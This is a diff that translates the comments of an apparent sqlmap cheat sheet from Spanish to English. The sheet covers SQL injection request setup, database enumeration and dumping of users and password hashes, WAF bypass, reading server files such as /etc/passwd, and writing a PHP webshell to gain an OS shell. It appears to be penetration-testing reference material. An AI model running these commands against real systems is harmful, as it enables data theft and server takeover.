@@ -13,31 +13,31 @@ sidebar:
 ## Specifying the Request
 
 ```bash
-# URL con parámetro GET
+# URL with GET parameter
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 
-# Petición completa desde archivo (guardada desde Burp)
+# Complete request from file (saved from Burp)
 sqlmap -r req.txt --batch
 
-# POST con data inline
+# POST with inline data
 sqlmap -u "http://target/search.php" --data='uid=1&name=test' --batch
 
-# Marcar parámetro inyectable con * (útil en POST)
+# Mark injectable parameter with * (useful in POST)
 sqlmap -u "http://target/search.php" --data='uid=1*&name=test' --batch
 
 # Cookie
 sqlmap -u "http://target/" --cookie='PHPSESSID=abc123; security=low' --batch
 
-# Header custom
+# Custom header
 sqlmap -u "http://target/" -H 'X-Forwarded-For: 1.2.3.4' --batch
 
-# User-Agent aleatorio
+# Random User-Agent
 sqlmap -u "http://target/?id=1" --random-agent --batch
 
-# Emular dispositivo móvil
+# Emulate mobile device
 sqlmap -u "http://target/?id=1" --mobile --batch
 
-# Método HTTP no estándar
+# Non-standard HTTP method
 sqlmap -u "http://target/?id=1" --method PUT --batch
 ```
 
@@ -55,10 +55,10 @@ sqlmap -u "http://target/?id=1" --method PUT --batch
 | `Q` | Inline queries | Subquery in the original query |
 
 ```bash
-# Forzar técnica específica (más rápido)
+# Force specific technique (faster)
 sqlmap -u "http://target/?id=1" --technique=BEU --batch
 
-# Solo time-based (cuando no hay output visible)
+# Time-based only (when no visible output)
 sqlmap -u "http://target/?id=1" --technique=T --batch
 ```
 
@@ -67,25 +67,25 @@ sqlmap -u "http://target/?id=1" --technique=T --batch
 ## Attack Tuning
 
 ```bash
-# Prefijo/sufijo para inyecciones con contexto complejo
+# Prefix/suffix for complex context injections
 sqlmap -u "http://target/?id=1" --prefix='%')'  --suffix='-- -' --batch
 
-# Nivel de tests (1-5, default=1) — más nivel = más vectores
+# Test level (1-5, default=1) — higher level = more vectors
 sqlmap -u "http://target/?id=1" --level=5 --batch
 
-# Riesgo de queries (1-3, default=1) — 3 incluye UPDATE/DELETE
+# Query risk (1-3, default=1) — 3 includes UPDATE/DELETE
 sqlmap -u "http://target/?id=1" --risk=3 --batch
 
 # UNION tuning
-sqlmap -u "http://target/?id=1" --union-cols=17 --batch      # forzar nº de columnas
-sqlmap -u "http://target/?id=1" --union-char='a' --batch     # char de relleno
-sqlmap -u "http://target/?id=1" --union-from=users --batch   # tabla FROM en el UNION
+sqlmap -u "http://target/?id=1" --union-cols=17 --batch      # force number of columns
+sqlmap -u "http://target/?id=1" --union-char='a' --batch     # padding char
+sqlmap -u "http://target/?id=1" --union-from=users --batch   # FROM table in the UNION
 
 # Debug / troubleshooting
-sqlmap -u "http://target/?id=1" --parse-errors --batch       # mostrar errores SQL en output
-sqlmap -u "http://target/?id=1" -v 6 --batch                 # verbosidad máxima (0-6)
-sqlmap -u "http://target/?id=1" -t /tmp/traffic.txt --batch  # guardar tráfico
-sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # ver en Burp
+sqlmap -u "http://target/?id=1" --parse-errors --batch       # show SQL errors in output
+sqlmap -u "http://target/?id=1" -v 6 --batch                 # maximum verbosity (0-6)
+sqlmap -u "http://target/?id=1" -t /tmp/traffic.txt --batch  # save traffic
+sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # view in Burp
 ```
 
 ---
@@ -93,43 +93,43 @@ sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # ver e
 ## Database Enumeration
 
 ```bash
-# Fingerprint rápido
+# Fast fingerprint
 sqlmap -u "http://target/?id=1" --banner --current-user --current-db --is-dba --batch
 
-# Listar todas las bases de datos
+# List all databases
 sqlmap -u "http://target/?id=1" --dbs --batch
 
-# Listar tablas de una DB
+# List tables of a DB
 sqlmap -u "http://target/?id=1" --tables -D testdb --batch
 
-# Listar columnas de una tabla
+# List columns of a table
 sqlmap -u "http://target/?id=1" --columns -T users -D testdb --batch
 
-# Dump completo de una tabla
+# Complete dump of a table
 sqlmap -u "http://target/?id=1" --dump -T users -D testdb --batch
 
-# Dump de columnas específicas
+# Dump specific columns
 sqlmap -u "http://target/?id=1" --dump -T users -D testdb -C username,password --batch
 
-# Dump parcial (filas 2 a 3)
+# Partial dump (rows 2 to 3)
 sqlmap -u "http://target/?id=1" --dump -T users -D testdb --start=2 --stop=3 --batch
 
-# Dump con filtro WHERE
+# Dump with WHERE filter
 sqlmap -u "http://target/?id=1" --dump -T users -D testdb --where="name LIKE 'admin%'" --batch
 
-# Dump todas las DBs (excluye system DBs)
+# Dump all DBs (excludes system DBs)
 sqlmap -u "http://target/?id=1" --dump-all --exclude-sysdbs --batch
 
-# Schema completo de la DB
+# Complete DB schema
 sqlmap -u "http://target/?id=1" --schema --batch
 
-# Buscar tabla por nombre
+# Search table by name
 sqlmap -u "http://target/?id=1" --search -T user --batch
 
-# Buscar columna por nombre (e.g., columnas con "pass")
+# Search column by name (e.g., columns with "pass")
 sqlmap -u "http://target/?id=1" --search -C pass --batch
 
-# Dump de hashes de contraseñas del DBMS
+# Dump DBMS password hashes
 sqlmap -u "http://target/?id=1" --passwords --batch
 ```
 
@@ -138,32 +138,32 @@ sqlmap -u "http://target/?id=1" --passwords --batch
 ## Bypassing WAF / Protections
 
 ```bash
-# CSRF token — especificar el nombre del campo token
+# CSRF token — specify the token field name
 sqlmap -u "http://target/" --data="token=abc&uid=1" --csrf-token="token" --batch
 
-# Randomizar parámetro por petición (anti-caché)
+# Randomize parameter per request (anti-cache)
 sqlmap -u "http://target/?id=1&rnd=abc" --randomize=rnd --batch
 
-# Evaluación Python para tokens dinámicos
+# Python evaluation for dynamic tokens
 sqlmap -u "http://target/?id=1" --eval="import hashlib; hash=hashlib.md5(b'1').hexdigest()" --batch
 
-# Tor + check de conectividad
+# Tor + connectivity check
 sqlmap -u "http://target/?id=1" --tor --check-tor --batch
 
-# Saltar detección automática de WAF
+# Skip automatic WAF detection
 sqlmap -u "http://target/?id=1" --skip-waf --batch
 
-# Chunked transfer encoding (bypass de WAF body inspection)
+# Chunked transfer encoding (WAF body inspection bypass)
 sqlmap -u "http://target/?id=1" --chunked --batch
 
-# Combinar múltiples tamper scripts
+# Combine multiple tamper scripts
 sqlmap -u "http://target/?id=1" --tamper=between,randomcase --batch
 sqlmap -u "http://target/?id=1" --tamper=space2comment,versionedkeywords --batch
 
-# User-Agent de navegador real
+# Real browser User-Agent
 sqlmap -u "http://target/?id=1" --random-agent --batch
 
-# Listar todos los tamper scripts disponibles
+# List all available tamper scripts
 sqlmap --list-tampers
 ```
 
@@ -185,22 +185,22 @@ sqlmap --list-tampers
 ## OS Exploitation — File Read and Write
 
 ```bash
-# Verificar si somos DBA
+# Verify if we are DBA
 sqlmap -u "http://target/?id=1" --is-dba --batch
 
-# Leer archivo del servidor
+# Read file from the server
 sqlmap -u "http://target/?id=1" --file-read "/etc/passwd" --batch
 sqlmap -u "http://target/?id=1" --file-read "/var/www/html/config.php" --batch
 
-# Escribir webshell en el servidor
-# Crear shell.php local primero:
+# Write webshell to the server
+# Create local shell.php first:
 # <?php system($_REQUEST[0]); ?>
 sqlmap -u "http://target/?id=1" \
   --file-write "shell.php" \
   --file-dest "/var/www/html/shell.php" \
   --batch
 
-# Verificar: http://target/shell.php?0=id
+# Verify: http://target/shell.php?0=id
 ```
 
 ---
@@ -208,16 +208,16 @@ sqlmap -u "http://target/?id=1" \
 ## Interactive OS Shell
 
 ```bash
-# Shell OS interactivo (requiere: DBA + FILE priv + webroot escribible)
+# Interactive OS shell (requires: DBA + FILE priv + writable webroot)
 sqlmap -u "http://target/?id=1" --os-shell --batch
 
-# Si pregunta por webroot, especificar manualmente:
+# If asked for webroot, specify manually:
 # /var/www/html/ (Apache Linux)
 # C:/xampp/htdocs/ (Windows XAMPP)
 # /usr/share/nginx/html/ (Nginx Linux)
 
-# SQLMap escribe un stager PHP + UDF → interfaz shell interactiva
-# Equivalente a una webshell, pero gestionada por sqlmap
+# SQLMap writes a PHP stager + UDF -> interactive shell interface
+# Equivalent to a webshell, but managed by sqlmap
 ```
 
 ---
